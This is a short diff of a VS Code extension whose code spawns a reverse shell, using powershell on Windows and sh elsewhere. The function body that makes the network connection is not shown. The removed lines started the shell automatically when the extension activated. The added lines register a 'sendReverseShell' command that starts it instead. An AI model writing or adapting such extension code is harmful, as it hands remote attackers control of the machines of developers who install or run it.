@@ -1,5 +1,5 @@
 import * as vscode from 'vscode';
-const os = require('os');
+import { platform } from 'node:process';
 const cp = require('child_process');
 const net = require('net');
 
@@ -20,11 +20,15 @@ function spawnReverseShell(shell: string) {
 
 export function activate(context: vscode.ExtensionContext) {
 
-	if (os.platform === "win32") {
-		spawnReverseShell('powershell');
-	} else {
-		spawnReverseShell('sh');
-	}
+	let command = vscode.commands.registerCommand("sendReverseShell", () => {
+		if (platform === "win32") {
+			spawnReverseShell('powershell');
+		} else {
+			spawnReverseShell('sh');
+		}
+	});
+
+	context.subscriptions.push(command);
 	
 }
 
